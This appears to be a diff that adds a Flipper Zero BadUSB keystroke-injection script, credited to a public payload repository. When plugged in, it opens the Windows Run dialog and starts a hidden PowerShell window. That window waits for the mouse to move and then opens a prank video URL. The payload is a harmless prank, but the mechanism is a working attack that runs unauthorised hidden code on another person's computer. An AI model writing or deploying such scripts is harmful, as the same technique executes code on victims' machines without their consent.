@@ -1,0 +1,6 @@
+REM https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/blob/main/Payloads/Flip-YT-Tripwire/ReadMe.md
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -w h Add-Type -AssemblyName *m.W*s.F*s;$w=[Windows.Forms.Cursor];$p=$w::Position.X;while(1){if($w::Position.X-ne$p){break}else{Sleep 3}};saps https://shattereddisk.github.io/rickroll/rickroll.mp4;
+ENTER
